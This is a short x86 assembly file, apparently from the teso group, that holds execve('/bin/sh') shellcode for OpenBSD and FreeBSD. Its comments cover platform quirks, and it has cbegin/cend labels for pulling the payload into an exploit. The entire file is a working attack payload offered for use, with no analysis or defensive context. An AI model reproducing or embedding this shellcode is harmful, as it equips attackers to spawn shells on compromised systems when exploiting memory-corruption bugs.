/* x86/BSD execve /bin/sh shellcode
 *  
 * lorian / teso
 */

/* somehow the obsd on plan9 where i tested it, needs the labels
 * exported with _ before, while freebsd doesnt 
 */

/* argv: OBSD needs a pointer to NULL, FBSD accepts NULL */

	.globl	cbegin
	.globl  _cbegin
	.globl	cend
	.globl  _cend

_cbegin:
cbegin:
        pushl     $0x3b
	popl      %eax
	cdq
	pushl     %edx
	movl      %esp, %ebx
	push      $0x68732F6E
	push      $0x69622F2F
	pusha                 /* FULLPOWER */
	pop       %esi
	pop       %esi
	int       $0x80
_cend:
cend:
